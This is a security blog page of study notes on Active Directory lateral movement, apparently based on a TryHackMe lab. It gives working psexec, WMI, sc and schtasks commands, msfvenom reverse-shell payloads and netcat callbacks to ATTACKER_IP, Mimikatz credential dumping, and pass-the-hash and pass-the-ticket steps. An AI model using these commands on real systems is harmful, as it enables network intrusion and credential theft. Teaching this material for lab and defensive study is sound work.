@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lateral Movement and Pivoting - pwn3rx0</title>
+  <meta name="description" content=">Title: Notes for Active Directory Basics >Author: Andrew mamdouh   What is Lateral Movement">
+  <meta name="keywords" content="cybersecurity, security, writeups, ctf, pentest, hacking, andrew mamdouh, pwn3rx0, andrew_mamdouh, active directory">
+  <meta name="author" content="Andrew Mamdouh (pwn3rx0)">
+  <meta property="og:title" content="Lateral Movement and Pivoting">
+  <meta property="og:description" content=">Title: Notes for Active Directory Basics >Author: Andrew mamdouh   What is Lateral Movement">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="/writeups/writeups-images/wallhaven-d6my2l.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:url" content="/writeups/Active Directory/Lateral Movement and Pivoting.html">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Lateral Movement and Pivoting">
+  <meta name="twitter:description" content=">Title: Notes for Active Directory Basics >Author: Andrew mamdouh   What is Lateral Movement">
+  <meta name="twitter:image" content="/writeups/writeups-images/wallhaven-d6my2l.png">
+  <meta name="site-base" content="/">
+  <link rel="stylesheet" href="/assets/css/styles.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/github-dark.min.css">
+</head>
+<body>
+  <div class="app-container">
+    <aside class="sidebar">
+      <div class="profile-card">
+        <div class="avatar">
+          <img src="/assets/images/profile.jpg" alt="Andrew Mamdouh">
+        </div>
+        <div class="profile-name">Andrew Mamdouh</div>
+        <div class="profile-nick" style="color:#8a8f98;">(pwn3rx0)</div>
+        <nav class="social-tabs">
+          <a class="chip" href="https://github.com/pwn3rx0">GitHub</a>
+          <a class="chip" href="https://www.linkedin.com/in/andrew-mamdouh122/">LinkedIn</a>
+          <a class="chip" href="https://x.com/pwn3rx0">X</a>
+        </nav>
+      </div>
+      <nav class="category-tree"></nav>
+    </aside>
+    <main class="main-content">
+      <nav class="breadcrumbs">
+      
+      <a href="/">Home</a>
+    
+      <span class="separator">/</span>
+      <a href="/category/Active Directory.html">Active Directory</a>
+    
+      <span class="separator">/</span>
+      <span class="current">Lateral Movement and Pivoting</span>
+    </nav>
+      <article class="writeup">
+        <header>
+          <h1>Lateral Movement and Pivoting</h1>
+          <div class="writeup-meta">
+            <div class="writeup-date">date: <time datetime="February 23, 2026">February 23, 2026</time></div>
+            <div class="tags-row">
+              <div class="tags-label">tags:</div>
+              <div class="tags"></div>
+            </div>
+            
+          </div>
+        </header>
+        <div class="writeup-content"><blockquote>
+<p>Title: Notes for Active Directory Basics
+Author: Andrew mamdouh</p>
+</blockquote>
+<h2>What is Lateral Movement?</h2>
+<p>Lateral movement refers to the techniques attackers use to pivot from an initially compromised host to other machines within a network after gaining an initial foothold.</p>
+<p><img src="/writeups/writeups-images/wallhaven-d6my2l.png" alt="wallhaven-d6my2l.png"></p>
+<hr>
+<h3>Purpose of Lateral Movement</h3>
+<ul>
+<li><strong>Reaching attack objectives</strong> (e.g., sensitive data, critical systems).</li>
+<li><strong>Bypassing network restrictions</strong> (e.g., firewall rules).</li>
+<li><strong>Establishing additional points of entry.</strong></li>
+<li><strong>Evading detection</strong> by blending in with normal user activity patterns.</li>
+</ul>
+<h3>The Lateral Movement Cycle</h3>
+<p>Lateral movement is a cyclical process, not a linear step:</p>
+<ol>
+<li>Use obtained credentials to move to a new host.</li>
+<li>Elevate privileges on the new host.</li>
+<li>Extract credentials (or other material) from the new host.</li>
+<li>Repeat with new credentials.</li>
+</ol>
+<p><img src="/writeups/writeups-images/Pasted%20image%2020260204023032.png" alt="Pasted image 20260204023032.png"></p>
+<h3>A Quick Example</h3>
+<ul>
+<li><em>Scenario:</em>* Goal is to access an internal code repository.</li>
+</ul>
+<ol>
+<li>Initial foothold is a <strong>Marketing workstation</strong> (limited network access).</li>
+<li>Privilege escalation and credential dumping reveals a local admin hash.</li>
+<li>The same local admin account exists on <strong>DEV-001-PC</strong> (a developer&#39;s machine).</li>
+<li>Lateral movement to DEV-001-PC using the hash.</li>
+<li>From the developer&#39;s machine, access the code repository is permitted and less suspicious.</li>
+</ol>
+<p><img src="/writeups/writeups-images/Pasted%20image%2020260204023107.png" alt="Pasted image 20260204023107.png"></p>
+<h2>The Attacker&#39;s Perspective</h2>
+<h3>Standard Administrative Protocols</h3>
+<p>Common, but potentially noisy, methods include:</p>
+<ul>
+<li>WinRM</li>
+<li>RDP</li>
+<li>VNC</li>
+<li>SSH</li>
+</ul>
+<div class="callout callout-tip"><div class="callout-title">OPSEC Consideration</div>
+
+<p>When using these methods, maintain coherence: use accounts that would logically connect to the target service/host to avoid triggering alerts.</p>
+</div>
+
+<h2>Administrators and UAC</h2>
+<div class="callout callout-warning"><div class="callout-title">UAC Remote Restrictions</div>
+
+<p>User Account Control (UAC) imposes restrictions on <strong>non-default local administrator accounts</strong> when they connect remotely (via RPC, SMB, WinRM), granting them a filtered medium-integrity token. This can block many lateral movement techniques.</p>
+</div>
+
+<h3>Administrator Account Types &amp; Remote Access</h3>
+<table>
+<thead>
+<tr>
+<th align="left">Account Type</th>
+<th align="left">Member of Local <code>Administrators</code> Group</th>
+<th align="left">Remote Administrative Privileges (Default)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Local Account</strong> (non-default)</td>
+<td align="left">Yes</td>
+<td align="left"><strong>No</strong> (filtered token via UAC). Blocked from many remote admin tasks.</td>
+</tr>
+<tr>
+<td align="left"><strong>Default Local Administrator</strong> (<code>RID-500</code>)</td>
+<td align="left">Yes</td>
+<td align="left"><strong>Yes</strong> (full privileges).</td>
+</tr>
+<tr>
+<td align="left"><strong>Domain Account</strong></td>
+<td align="left">Yes</td>
+<td align="left"><strong>Yes</strong> (full privileges).</td>
+</tr>
+</tbody></table>
+<ul>
+<li><em>Key Takeaway:</em>* For reliable remote lateral movement, prefer domain admin accounts or the default local Administrator account (RID-500).</li>
+</ul>
+<hr>
+<h2>Spawning Processes Remotely</h2>
+<h3>Psexec</h3>
+<ul>
+<li><strong>Protocol/Port:</strong> SMB over <strong>445/TCP</strong></li>
+<li><strong>Required Privileges:</strong> Member of the target&#39;s local <strong><code>Administrators</code></strong> group.</li>
+<li><strong>Mechanism:</strong><ol>
+<li>Connects to the target&#39;s <code>Admin$</code> share and uploads <code>psexesvc.exe</code>.</li>
+<li>Connects to the Service Control Manager (SCM) to create/run the <code>PSEXESVC</code> service.</li>
+<li>Creates named pipes to handle I/O.</li>
+</ol>
+</li>
+<li><strong>Command:</strong></li>
+</ul>
+<pre><code class="language-bash"># psexec64.exe \\MACHINE_IP -u Administrator -p Password -i cmd.exe
+psexec64.exe \\10.10.10.10 -u Administrator -p Mypass123 -i cmd.exe
+</code></pre>
+<h3>Remote Process Creation Using WinRM</h3>
+<ul>
+<li><strong>Protocol/Port:</strong> WinRM over <strong>5985/TCP (HTTP)</strong> or <strong>5986/TCP (HTTPS)</strong></li>
+<li><strong>Required Privileges:</strong> Member of <strong><code>Remote Management Users</code></strong> or local <strong><code>Administrators</code></strong>.</li>
+<li><strong>Using <code>winrs</code> (Command Line):</strong></li>
+</ul>
+<pre><code class="language-bash"># winrs.exe -u:Username -p:Password -r:target cmd
+winrs.exe -u:Administrator -p:Mypass123 -r:10.10.10.10 cmd
+</code></pre>
+<ul>
+<li><strong>Using PowerShell (<code>Enter-PSSession</code> or <code>Invoke-Command</code>):</strong></li>
+</ul>
+<pre><code class="language-powershell"># Create a PSCredential object
+$username = &#39;Administrator&#39;;
+$password = &#39;Mypass123&#39;;
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+# Method 1: Interactive Session
+Enter-PSSession -Computername TARGET -Credential $credential
+
+# Method 2: Execute a ScriptBlock
+Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock { whoami }
+</code></pre>
+<h3>Remotely Creating Services Using <code>sc</code></h3>
+<ul>
+<li><strong>Protocol/Ports:</strong><ul>
+<li>DCE/RPC: <strong>135/TCP &amp; dynamic ports (49152-65535)</strong></li>
+<li>RPC over SMB Named Pipes: <strong>445/TCP</strong> or <strong>139/TCP</strong></li>
+</ul>
+</li>
+<li><strong>Required Privileges:</strong> Member of the target&#39;s local <strong><code>Administrators</code></strong> group.</li>
+<li><strong>Mechanism:</strong> Connects to the Service Control Manager (SVCCTL) via RPC or SMB named pipes to create/manage services.</li>
+<li><strong>Create and Start a Service:</strong></li>
+</ul>
+<pre><code class="language-bash"># Create a service that runs a command on start
+sc.exe \\TARGET create ServiceName binPath= &quot;command_to_run&quot; start= auto
+sc.exe \\TARGET start ServiceName
+
+# Example: Adds a local user
+sc.exe \\10.10.10.10 create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto
+sc.exe \\10.10.10.10 start THMservice
+</code></pre>
+<ul>
+<li><strong>Stop and Delete a Service:</strong></li>
+</ul>
+<pre><code class="language-bash">sc.exe \\TARGET stop ServiceName
+sc.exe \\TARGET delete ServiceName
+</code></pre>
+<div class="callout callout-info"><div class="callout-title">Service Binary Limitation</div>
+
+<p>Standard executables run as services are killed quickly by the service manager. Use <code>msfvenom</code>&#39;s <code>exe-service</code> format to create persistent service payloads.</p>
+</div>
+
+<h3>Creating Scheduled Tasks Remotely Using <code>schtasks</code></h3>
+<ul>
+<li><strong>Protocol/Port:</strong> Uses same underlying protocols as <code>sc</code> (RPC/SMB).</li>
+<li><strong>Required Privileges:</strong> Member of the target&#39;s local <strong><code>Administrators</code></strong> group.</li>
+<li><strong>Create and Run a Task:</strong></li>
+</ul>
+<pre><code class="language-bash"># Create a task running as SYSTEM that executes once
+schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;TaskName&quot; /tr &quot;command_or_payload&quot; /sc ONCE /sd 01/01/1970 /st 00:00
+# Run the task immediately
+schtasks /s TARGET /run /TN &quot;TaskName&quot;
+</code></pre>
+<ul>
+<li><strong>Delete a Task:</strong></li>
+</ul>
+<pre><code class="language-bash">schtasks /S TARGET /TN &quot;TaskName&quot; /DELETE /F
+</code></pre>
+<hr>
+<h2>Practical Example: Lateral Movement via <code>sc</code></h2>
+<ul>
+<li><em>Scenario:</em>* Move from THMJMP2 to THMIIS using captured admin credentials.</li>
+</ul>
+<ul>
+<li><strong>User:</strong> <code>ZA.TRYHACKME.COM\t1_leonard.summers</code></li>
+<li><strong>Pass:</strong> <code>EZpass4ever</code></li>
+</ul>
+<h3>Step 1: Generate a Service Payload</h3>
+<pre><code class="language-bash"># Generate a reverse shell payload encapsulated as a Windows service
+msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe-service -o myservice.exe
+</code></pre>
+<h3>Step 2: Upload Payload to Target</h3>
+<pre><code class="language-bash"># Upload the payload to the target&#39;s ADMIN$ share via SMB
+smbclient -U t1_leonard.summers -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; &#39;EZpass4ever&#39; -c &#39;put myservice.exe&#39;
+</code></pre>
+<h3>Step 3: Set Up Listeners</h3>
+<pre><code class="language-bash"># Listener for the final reverse shell (from the service)
+msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit&quot;
+</code></pre>
+<pre><code class="language-bash"># Listener for an intermediate shell with the stolen token (on a different port)
+nc -lvp 4443
+</code></pre>
+<h3>Step 4: Spawn Shell with Stolen Token on THMJMP2</h3>
+<div class="callout callout-warning"><div class="callout-title">NetOnly Context</div>
+
+<p><code>runas /netonly</code> spawns a process with the provided credentials for <strong>network authentication only</strong>. It does not validate the credentials locally. Typos will cause later failures.</p>
+</div>
+
+<pre><code class="language-cmd"># On THMJMP2 (via SSH), spawn a reverse shell using the stolen credentials for network auth
+runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443&quot;
+</code></pre>
+<p>This connects back to your <code>nc</code> listener (port 4443), giving you a command prompt that authenticates as <code>t1_leonard.summers</code> over the network.</p>
+<h3>Step 5: Create &amp; Start Service on THMIIS</h3>
+<pre><code class="language-cmd"># From the shell obtained in Step 4 (now with t1_leonard.summers network token)
+sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= &quot;%windir%\myservice.exe&quot; start= auto
+sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
+</code></pre>
+<p>The service starts, executes the payload, and sends a reverse shell back to your Metasploit listener (port 4444).</p>
+<hr>
+<h2>Moving Laterally Using WMI</h2>
+<div class="callout callout-info"><div class="callout-title">WMI Overview</div>
+
+<p>Windows Management Instrumentation (WMI) is Microsoft&#39;s implementation of the Web-Based Enterprise Management (WBEM) standard. It provides a framework for administrative task automation, which attackers can abuse for lateral movement.</p>
+</div>
+
+<h3>Establishing a WMI Session from PowerShell</h3>
+<ul>
+<li><p><em>Protocols &amp; Ports:</em>*</p>
+</li>
+<li><p><strong>DCOM (Default):</strong> Uses RPC over IP. <strong>Port 135/TCP</strong> and dynamic ports (<strong>49152-65535/TCP</strong>).</p>
+</li>
+<li><p><strong>Wsman:</strong> Uses WinRM. <strong>Port 5985/TCP (HTTP)</strong> or <strong>5986/TCP (HTTPS)</strong>.</p>
+</li>
+<li><p><em>Create a PSCredential and Session:</em>*</p>
+</li>
+</ul>
+<pre><code class="language-powershell"># Create credential object
+$username = &#39;Administrator&#39;;
+$password = &#39;Mypass123&#39;;
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+# Establish WMI session using DCOM protocol
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+</code></pre>
+<h2>WMI Lateral Movement Techniques</h2>
+<h3>Remote Process Creation</h3>
+<ul>
+<li><p><strong>Required Privileges:</strong> Local <code>Administrators</code> group.</p>
+</li>
+<li><p><strong>Method:</strong> Invoke the <code>Create</code> method of the <code>Win32_Process</code> class.</p>
+</li>
+</ul>
+<pre><code class="language-powershell">$Command = &quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;;
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+    CommandLine = $Command
+}
+</code></pre>
+<div class="callout callout-info"><div class="callout-title">Blind Execution</div>
+
+<p>WMI process creation does not provide output to the attacker. The process runs silently.</p>
+</div>
+
+<ul>
+<li><strong>Legacy Method using <code>wmic</code>:</strong></li>
+</ul>
+<pre><code class="language-cmd">wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create &quot;cmd.exe /c calc.exe&quot;
+</code></pre>
+<h3>Creating Services Remotely</h3>
+<ul>
+<li><p><strong>Required Privileges:</strong> Local <code>Administrators</code> group.</p>
+</li>
+<li><p><strong>Method:</strong> Use the <code>Win32_Service</code> class.</p>
+</li>
+</ul>
+<pre><code class="language-powershell"># Create a service
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+    Name = &quot;THMService2&quot;;
+    DisplayName = &quot;THMService2&quot;;
+    PathName = &quot;net user munra2 Pass123 /add&quot;; # Payload/command
+    ServiceType = [byte]::Parse(&quot;16&quot;); # Win32OwnProcess - starts in new process
+    StartMode = &quot;Manual&quot;
+}
+
+# Get a handle to the service and start it
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter &quot;Name LIKE &#39;THMService2&#39;&quot;
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+
+# Cleanup: Stop and delete the service
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+</code></pre>
+<h3>Creating Scheduled Tasks Remotely</h3>
+<ul>
+<li><strong>Required Privileges:</strong> Local <code>Administrators</code> group.</li>
+</ul>
+<pre><code class="language-powershell"># Split payload into Command and Arguments
+$Command = &quot;cmd.exe&quot;
+$Args = &quot;/c net user munra22 aSdf1234 /add&quot;
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User &quot;NT AUTHORITY\SYSTEM&quot; -TaskName &quot;THMtask2&quot;
+Start-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot;
+
+# Cleanup: Delete the task
+Unregister-ScheduledTask -CimSession $Session -TaskName &quot;THMtask2&quot;
+</code></pre>
+<h3>Installing MSI Packages</h3>
+<ul>
+<li><p><strong>Required Privileges:</strong> Local <code>Administrators</code> group.</p>
+</li>
+<li><p><strong>Method:</strong> Use the <code>Install</code> method of the <code>Win32_Product</code> class. The MSI file must first be placed on the target (e.g., via SMB to <code>C:\Windows\</code>).</p>
+</li>
+</ul>
+<pre><code class="language-powershell">Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
+    PackageLocation = &quot;C:\Windows\myinstaller.msi&quot;;
+    Options = &quot;&quot;;
+    AllUsers = $false
+}
+</code></pre>
+<ul>
+<li><strong>Legacy Method using <code>wmic</code>:</strong></li>
+</ul>
+<pre><code class="language-cmd">wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+</code></pre>
+<hr>
+<h2>Practical Example: Lateral Movement via WMI &amp; MSI</h2>
+<ul>
+<li><em>Scenario:</em>* Move from THMJMP2 to THMIIS using captured admin credentials.</li>
+</ul>
+<ul>
+<li><p><strong>User:</strong> <code>ZA.TRYHACKME.COM\t1_corine.waters</code></p>
+</li>
+<li><p><strong>Pass:</strong> <code>Korine.1994</code></p>
+</li>
+</ul>
+<h3>Step 1: Generate an MSI Payload</h3>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f msi &gt; myinstaller.msi
+</code></pre>
+<h3>Step 2: Upload Payload to Target</h3>
+<pre><code class="language-bash">smbclient -U t1_corine.waters -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; &#39;Korine.1994&#39; -c &#39;put myinstaller.msi&#39;
+# File lands at C:\Windows\myinstaller.msi on the target
+</code></pre>
+<h3>Step 3: Set Up Listener</h3>
+<pre><code class="language-bash"># In msfconsole
+use exploit/multi/handler
+set payload windows/x64/shell_reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 4445
+exploit
+</code></pre>
+<h3>Step 4: Establish WMI Session &amp; Trigger Payload</h3>
+<p>On THMJMP2 (via SSH), in PowerShell:</p>
+<pre><code class="language-powershell"># Create credential and WMI session (using DCOM)
+$username = &#39;t1_corine.waters&#39;;
+$password = &#39;Korine.1994&#39;;
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+# Install the MSI package (triggers the reverse shell)
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
+    PackageLocation = &quot;C:\Windows\myinstaller.msi&quot;;
+    Options = &quot;&quot;;
+    AllUsers = $false
+}
+</code></pre>
+<hr>
+<h2>Use of Alternate Authentication Material</h2>
+<p>Alternate authentication material allows access to Windows accounts without knowing the plaintext password, by leveraging weaknesses in authentication protocols like NTLM and Kerberos.</p>
+<hr>
+<h2>NTLM Authentication &amp; Pass-the-Hash (PtH)</h2>
+<div class="callout callout-info"><div class="callout-title">NTLM Authentication Flow</div>
+
+<ol>
+<li>Client sends auth request.</li>
+<li>Server sends challenge (random number).</li>
+<li>Client computes response using <strong>NTLM hash + challenge</strong>.</li>
+<li>Server forwards challenge/response to Domain Controller (DC) for verification (for domain accounts) or verifies locally (local accounts).</li>
+<li>DC/server sends auth result.</div></li>
+</ol>
+<h3>Extracting NTLM Hashes with Mimikatz</h3>
+<ul>
+<li><strong>From Local SAM (Local Users Only):</strong></li>
+</ul>
+<pre><code class="language-bash">mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+# Output includes local user NTLM hashes
+</code></pre>
+<ul>
+<li><strong>From LSASS Memory (Local &amp; Recently Logged-on Domain Users):</strong></li>
+</ul>
+<pre><code class="language-bash">mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # sekurlsa::msv
+# Lists NTLM hashes for cached credentials
+</code></pre>
+<h3>Performing Pass-the-Hash</h3>
+<ul>
+<li><p><strong>Using Mimikatz (inject token):</strong></p>
+<blockquote>
+<p>[!warning] Token Revert Required
+PtH must be performed from a non-elevated token context.</p>
+</blockquote>
+</li>
+</ul>
+<pre><code class="language-bash">mimikatz # token::revert
+mimikatz # sekurlsa::pth /user:UserName /domain:DomainName /ntlm:HASH /run:&quot;command&quot;
+# Example: Spawns reverse shell using stolen hash
+mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:&quot;c:\tools\nc64.exe -e cmd.exe 10.10.10.10 5555&quot;
+</code></pre>
+<ul>
+<li><strong>Using Linux Tools:</strong></li>
+</ul>
+<pre><code class="language-bash"># RDP with PtH
+xfreerdp /v:VICTIM_IP /u:DOMAIN\\User /pth:NTLM_HASH
+
+# psexec with PtH (Linux version only)
+psexec.py -hashes NTLM_HASH DOMAIN/User@VICTIM_IP
+
+# WinRM with PtH
+evil-winrm -i VICTIM_IP -u User -H NTLM_HASH
+</code></pre>
+<hr>
+<h2>Kerberos Authentication &amp; Attacks</h2>
+<div class="callout callout-info"><div class="callout-title">Kerberos Authentication Flow</div>
+
+
+<ol>
+<li><p><strong>TGT Request:</strong> User encrypts timestamp with password-derived key, sends to KDC (Key Distribution Center).</p>
+</li>
+<li><p><strong>TGT Issued:</strong> KDC returns Ticket Granting Ticket (TGT) encrypted with <code>krbtgt</code> account hash, and a Session Key.</p>
+</li>
+<li><p><strong>TGS Request:</strong> For a specific service (SPN), user sends TGT + encrypted timestamp (with Session Key) to KDC.</p>
+</li>
+<li><p><strong>TGS Issued:</strong> KDC returns Ticket Granting Service (TGS) encrypted with service account hash, and a Service Session Key.</p>
+</li>
+<li><p><strong>Service Authentication:</strong> User presents TGS to the service, which decrypts it with its own password hash.</p>
+</li>
+</ol>
+</div>
+
+<h3>Pass-the-Ticket (PtT)</h3>
+<p>Extract and reuse Kerberos tickets from LSASS memory.</p>
+<ul>
+<li><strong>Extract Tickets (Admin for TGTs, Low-priv for own TGSs):</strong></li>
+</ul>
+<pre><code class="language-bash">mimikatz # privilege::debug
+mimikatz # sekurlsa::tickets /export
+# Exports .kirbi ticket files
+</code></pre>
+<ul>
+<li><strong>Inject Ticket into Current Session (No Admin Required):</strong></li>
+</ul>
+<pre><code class="language-bash">mimikatz # kerberos::ptt [ticket_file.kirbi]
+</code></pre>
+<ul>
+<li><strong>Verify Injected Tickets:</strong></li>
+</ul>
+<pre><code class="language-bash">klist
+# Lists cached Kerberos tickets
+</code></pre>
+<h3>Pass-the-Key / Overpass-the-Hash (PtK/OPtH)</h3>
+<p>Use Kerberos encryption keys (derived from password) to request a TGT without the password. The key type depends on domain configuration (RC4, AES128, AES256).</p>
+<ul>
+<li><strong>Extract Kerberos Keys:</strong></li>
+</ul>
+<pre><code class="language-bash">mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+</code></pre>
+<ul>
+<li><strong>Perform PtK/OPtH Attack:</strong></li>
+</ul>
+<pre><code class="language-bash"># Using RC4 key (equals NTLM hash - &quot;Overpass-the-Hash&quot;)
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:HASH /run:&quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556&quot;
+
+# Using AES128 key
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:KEY /run:&quot;...&quot;
+
+# Using AES256 key
+mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:KEY /run:&quot;...&quot;
+</code></pre>
+<hr>
+</div>
+        <nav class="post-navigation">
+          
+      <a href="/writeups/Active Directory/Enumerating Active Directory.html" class="nav-link prev-post">
+        <span class="nav-direction">← Previous</span>
+        <span class="nav-title">Enumerating Active Directory</span>
+      </a>
+    
+          <span class="nav-link disabled"><span class="nav-direction">Next →</span><span class="nav-title">No newer post</span></span>
+        </nav>
+        
+      </article>
+    </main>
+  </div>
+  <button class="mobile-menu-toggle">☰</button>
+  <script src="/assets/js/main.js"></script>
+  <script src="/assets/js/navigation.js"></script>
+  <script>
+    window.MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        displayMath: [['$$','$$'], ['\\[','\\]']]
+      },
+      svg: { fontCache: 'global' }
+    };
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" defer></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/c.min.js" defer></script>
+  <script>
+    (function() {
+      function enhanceCodeBlocks(scope) {
+        const container = scope || document.querySelector('.writeup-content') || document;
+        const blocks = Array.from(container.querySelectorAll('pre > code')).filter(c => !c.closest('.code-block'));
+        blocks.forEach(code => {
+          const pre = code.parentElement;
+          if (!pre || pre.dataset.enhanced === 'true') return;
+          pre.dataset.enhanced = 'true';
+          let langClass = Array.from(code.classList || []).find(c => c.startsWith('language-'));
+          if (!langClass) {
+            const t = code.textContent || '';
+            if (/#include\s+<[^>]+>/.test(t) || /\bint\s+main\s*\(/.test(t) || /#include\s+<Windows\.h>/i.test(t)) {
+              code.classList.add('language-c');
+              langClass = 'language-c';
+            }
+          }
+          const lang = (langClass ? langClass.replace('language-', '') : 'text').toUpperCase();
+          const wrapper = document.createElement('div');
+          wrapper.className = 'code-block';
+          const header = document.createElement('div');
+          header.className = 'code-header';
+          const langEl = document.createElement('span');
+          langEl.className = 'code-lang';
+          langEl.textContent = lang;
+          const btn = document.createElement('button');
+          btn.className = 'code-copy';
+          btn.type = 'button';
+          btn.textContent = 'Copy';
+          btn.addEventListener('click', async () => {
+            const text = code.innerText;
+            const fallbackCopy = () => {
+              const ta = document.createElement('textarea');
+              ta.value = text;
+              ta.style.position = 'fixed';
+              ta.style.opacity = '0';
+              ta.style.left = '-9999px';
+              document.body.appendChild(ta);
+              ta.focus();
+              ta.select();
+              try {
+                document.execCommand('copy');
+                btn.textContent = 'Copied';
+              } catch (_) {
+                btn.textContent = 'Failed';
+              } finally {
+                document.body.removeChild(ta);
+                setTimeout(() => (btn.textContent = 'Copy'), 1200);
+              }
+            };
+            try {
+              if (navigator.clipboard && window.isSecureContext) {
+                await navigator.clipboard.writeText(text);
+                btn.textContent = 'Copied';
+                setTimeout(() => (btn.textContent = 'Copy'), 1200);
+              } else {
+                fallbackCopy();
+              }
+            } catch (_) {
+              fallbackCopy();
+            }
+          });
+          header.appendChild(langEl);
+          header.appendChild(btn);
+          const holder = document.createElement('div');
+          holder.className = 'code-content';
+          pre.replaceWith(wrapper);
+          holder.appendChild(pre);
+          wrapper.appendChild(header);
+          wrapper.appendChild(holder);
+          if (window.hljs && typeof window.hljs.highlightElement === 'function') {
+            window.hljs.highlightElement(code);
+          } else if (window.hljs && typeof window.hljs.highlightAll === 'function') {
+            window.hljs.highlightAll();
+          }
+        });
+      }
+      function indentAfterHeadings(scope) {
+        const container = scope || document.querySelector('.writeup-content');
+        if (!container) return;
+        const headings = container.querySelectorAll('h1,h2,h3,h4,h5,h6');
+        headings.forEach(h => {
+          const level = parseInt(h.tagName.substring(1), 10);
+          let el = h.nextElementSibling;
+          while (el) {
+            if (/^H[1-6]$/.test(el.tagName)) {
+              const nextLevel = parseInt(el.tagName.substring(1), 10);
+              if (nextLevel <= level) break;
+            }
+            if (el.tagName === 'P') {
+              el.classList.add('indent-p');
+            }
+            el = el.nextElementSibling;
+          }
+        });
+      }
+      function initEnhancements() {
+        if (window.mermaid) {
+          mermaid.initialize({ startOnLoad: true, theme: 'dark' });
+        }
+        enhanceCodeBlocks();
+        indentAfterHeadings();
+        if (window.hljs && typeof window.hljs.highlightAll === 'function') {
+          window.hljs.highlightAll();
+        }
+        const target = document.querySelector('.writeup-content');
+        if (target && window.MutationObserver) {
+          const mo = new MutationObserver(() => {
+            enhanceCodeBlocks(target);
+            indentAfterHeadings(target);
+            if (window.hljs && typeof window.hljs.highlightAll === 'function') {
+              window.hljs.highlightAll();
+            }
+          });
+          mo.observe(target, { childList: true, subtree: true });
+        }
+      }
+      window.addEventListener('load', initEnhancements);
+    })();
+  </script>
+</body>
+</html>
